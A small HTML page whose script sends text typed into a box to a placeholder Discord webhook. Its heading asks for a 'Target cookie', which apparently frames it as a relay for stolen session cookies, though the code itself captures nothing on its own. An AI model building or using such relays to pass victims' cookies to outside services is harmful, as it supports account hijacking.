<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Send to Discord</title>
  <style>
    body {
      background-color: #1e3a8a; /* Dark blue background */
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #2563eb; /* Blue box */
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      text-align: center;
    }

    textarea {
      width: 300px;
      height: 100px;
      border: none;
      border-radius: 8px;
      padding: 10px;
      resize: none;
      font-size: 14px;
      outline: none;
      background-color: #3b82f6; /* lighter blue */
      color: white;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      background-color: #1d4ed8; /* blue button */
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #2563eb;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2 style="color:white;">Type Your Target cookie</h2>
    <textarea id="message" placeholder="Type your message..."></textarea><br>
    <button onclick="sendMessage()">Send</button>
  </div>

  <script>
    const webhookURL = "YOUR_WEBHOOK_URL_HERE"; // <-- replace with your Discord webhook

    function sendMessage() {
      const message = document.getElementById("message").value;

      if (!message) {
        alert("Please enter a message!");
        return;
      }

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          alert("Message sent!");
          document.getElementById("message").value = "";
        } else {
          alert("Error sending message.");
        }
      })
      .catch(err => {
        console.error(err);
        alert("Request failed.");
      });
    }
  </script>
</body>
</html>
